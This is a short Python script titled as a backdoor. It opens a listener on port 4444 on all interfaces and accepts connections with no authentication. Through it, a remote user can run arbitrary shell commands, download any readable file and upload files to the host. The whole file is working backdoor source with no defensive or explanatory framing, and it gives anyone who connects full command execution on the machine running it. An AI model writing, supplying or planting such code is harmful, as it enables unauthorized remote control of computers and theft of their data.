import socket
import threading
import subprocess
import os
import sys

class BackdoorListener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
    def start(self):
        self.server.bind((self.ip, self.port))
        self.server.listen(5)
        print(f"[*] Listening on {self.ip}:{self.port}")
        
        while True:
            client, address = self.server.accept()
            print(f"[+] Connection from {address}")
            thread = threading.Thread(target=self.handle_client, args=(client,))
            thread.start()
    
    def handle_client(self, client):
        # Send initial shell
        client.send(b"Backdoor Shell Connected\n> ")
        
        while True:
            try:
                # Receive command
                command = client.recv(1024).decode().strip()
                
                if command.lower() == 'exit':
                    break
                elif command.startswith('download '):
                    # File download
                    filename = command[9:]
                    if os.path.exists(filename):
                        with open(filename, 'rb') as f:
                            data = f.read()
                        client.send(data)
                    else:
                        client.send(b"File not found\n")
                elif command.startswith('upload '):
                    # File upload
                    filename = command[7:]
                    data = client.recv(4096)
                    with open(filename, 'wb') as f:
                        f.write(data)
                    client.send(b"Upload complete\n")
                else:
                    # Execute system command
                    output = subprocess.run(command, shell=True, 
                                          capture_output=True, text=True)
                    result = output.stdout + output.stderr
                    if result:
                        client.send(result.encode())
                    else:
                        client.send(b"Command executed\n")
                    
                client.send(b"\n> ")
                
            except Exception as e:
                print(f"Error: {e}")
                break
        
        client.close()

if __name__ == "__main__":
    listener = BackdoorListener("0.0.0.0", 4444)
    listener.start()